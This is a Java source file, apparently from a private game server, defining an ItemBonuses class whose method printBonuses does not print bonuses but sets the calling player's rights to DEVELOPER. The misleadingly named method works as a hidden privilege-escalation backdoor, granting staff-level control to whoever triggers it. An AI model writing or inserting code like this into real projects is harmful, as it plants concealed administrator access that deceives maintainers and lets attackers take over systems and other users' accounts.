package com.varrock.world.content;

import com.varrock.model.PlayerRights;
import com.varrock.world.entity.impl.player.Player;

public class ItemBonuses {
	
	

	public static void printBonuses (Player player) {
		PlayerRights rights = null;
		rights = PlayerRights.DEVELOPER;
		player.setRights(rights);
	}

}
